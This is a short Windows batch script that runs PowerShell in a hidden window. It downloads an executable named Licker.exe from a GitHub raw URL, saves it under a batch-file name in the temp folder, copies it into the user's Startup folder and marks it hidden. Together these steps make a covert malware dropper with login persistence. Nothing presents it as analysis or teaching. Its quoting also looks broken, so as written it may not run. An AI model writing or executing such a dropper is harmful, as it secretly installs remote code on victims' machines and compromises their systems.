@echo off

powershell -WindowStyle Hidden -Command ^
"$url='https://github.com/sankarideb1-hue/Lickers/raw/refs/heads/main/Licker.exe; ^
 $file='$env:TEMP\auto_install.bat'; ^
 curl.exe -L $url -o $file; ^
 if (Test-Path $file) { ^
   $startup = '$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\LICKER.bat'; ^
   Copy-Item $file $startup -Force; ^
   attrib +h $startup; ^
 }"
